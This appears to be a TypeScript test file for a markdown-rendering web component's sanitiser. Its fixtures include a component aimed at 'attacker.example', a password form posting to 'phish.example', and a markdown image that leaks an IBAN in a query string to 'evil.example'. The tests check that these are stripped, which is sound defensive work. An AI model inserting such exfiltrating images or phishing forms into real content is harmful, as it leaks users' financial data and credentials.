// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import './mateu-markdown'

const rendered = async (content: string, noRemoteImages = false): Promise<HTMLElement> => {
    const el = document.createElement('mateu-markdown') as HTMLElement & { content?: string }
    if (noRemoteImages) el.setAttribute('no-remote-images', '')
    document.body.appendChild(el)
    el.content = content
    for (let i = 0; i < 50 && !el.innerHTML; i++) await new Promise(r => setTimeout(r, 10))
    return el
}

describe('mateu-markdown sanitises with the data policy (B1)', () => {
    it('renders markdown and drops a <mateu-ux> aimed at another origin', async () => {
        const el = await rendered('# Hi\n\n<mateu-ux baseurl="https://attacker.example" route="x"></mateu-ux>'
            + '<form action="https://phish.example"><input type="password"></form>')
        expect(el.querySelector('h1')?.textContent).toBe('Hi')
        expect(el.innerHTML).not.toMatch(/mateu-ux|attacker|<form|<input/i)
    })

    it('S13: in the chat (no-remote-images) an image that would be fetched is its alt text; a data: one stays', async () => {
        const md = 'Look ![the chart](https://evil.example/x.png?iban=ES00) and ![inline](data:image/png;base64,iVBORw0KGgo=)'
        const chat = await rendered(md, true)
        expect(chat.innerHTML).not.toMatch(/evil\.example/)
        expect(chat.textContent).toContain('the chart')
        expect(chat.querySelectorAll('img')).toHaveLength(1)
        expect(chat.querySelector('img')?.getAttribute('src')).toMatch(/^data:/)
        // a page's own markdown keeps its images
        const page = await rendered(md)
        expect(page.querySelector('img[src^="https://evil.example"]')).not.toBeNull()
    })

    it('keeps an allow-listed vaadin-icon', async () => {
        const el = await rendered('<vaadin-icon icon="vaadin:check"></vaadin-icon> ok')
        expect(el.querySelector('vaadin-icon')?.getAttribute('icon')).toBe('vaadin:check')
    })
})
